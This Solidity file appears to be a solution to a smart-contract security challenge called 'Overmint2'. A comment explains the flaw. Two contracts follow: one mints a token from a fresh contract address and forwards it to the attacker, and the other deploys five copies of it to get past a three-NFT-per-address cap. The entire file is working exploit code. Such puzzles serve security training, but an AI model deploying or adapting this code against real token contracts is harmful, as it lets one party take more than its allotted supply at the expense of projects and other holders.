// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Overmint2.sol";

/*
Contract uses _mint instead of _safeMint, so we do not get the ERC721 callback
Instead we can deploy new contracts to get new addresses, which will let us get
around the check below as often as we need
require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
*/

contract MintOne {
    Overmint2 private om;
    constructor(address _victimContract, address _attackerAddr, uint256 tokenId) {
        om = Overmint2(_victimContract);
        om.mint();
        om.transferFrom(address(this), _attackerAddr, tokenId);
    }
}

contract Overmint2Attacker {
    Overmint2 private om;
    uint8 callCount;

    constructor(address _victimContract) {
        new MintOne(_victimContract, msg.sender, 1);
        new MintOne(_victimContract, msg.sender, 2);
        new MintOne(_victimContract, msg.sender, 3);
        new MintOne(_victimContract, msg.sender, 4);
        new MintOne(_victimContract, msg.sender, 5);
    }
}
